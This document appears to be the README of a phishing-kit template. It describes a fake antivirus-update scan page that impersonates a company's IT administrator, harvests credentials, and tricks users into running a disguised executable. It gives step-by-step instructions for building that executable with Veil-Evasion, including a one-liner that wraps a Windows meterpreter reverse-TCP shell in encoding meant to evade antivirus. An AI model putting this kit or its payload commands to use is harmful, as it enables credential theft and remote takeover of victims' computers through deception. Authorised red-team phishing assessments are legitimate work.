# AV Update Template

**Objective:** Credential harvesting *and* shell

## Pretext:
Spoofing as an IT administrator, you're pushing out new antivirus software
and need users to help run an automated scan to see if the new software was
pushed to their computer and is up-to-date. After the scan page reaches
around 70%, the page redirects and notifies the user that they need to
download and run a file becuase their AV is out of date.

## Things you'll need to change:
* File: ./login: 
  * name="logo" -> update to the company logo
  * Store company logo in the images folder. name it logo.png

* File: ./scan: 
  * name="logo" -> update to company logo

* File: /include/style-login-new.css
  * footer#bottom -> update the background:# to the spoofed company color if wanted. 
  * header -> update background-color:# to spoofed company color if wanted.
* File: PartnerPlus_Antivirus_v3.5.3.exe
  * Create your own executable file. MSFVenom gets popped by AV, so use Veil if possible. Instructions are below.

## Creating your own Executable using Veil Framework:
1. Setting up Veil-Evasion 
  a. git clone git@github.com:Veil-Framework/Veil-Evasion.git
  b. cd veil-Evasion
  c. ./setup/setup.sh -s
2. Creating a payload
  a. you can use the step-by-step instructions found in step 2.b. or modify and use the one-liner below
    * ` ./Veil-Evasion.py  -l  python -p python/b64_substitution  -o trytofindthis –msfpayload windows/meterpreter/reverse_tcp –msfoptions LHOST=<listening box> LPORT=443`
  b. tutorial: https://sathisharthars.wordpress.com/2014/06/07/evading-antivirus-using-veil-framework-in-kali-linux/
3. **MAKE SURE YOU NAME IT** PartnerPlus_Antivirus_v3.5.3.exe or you'll have to edit the 'failed' page.
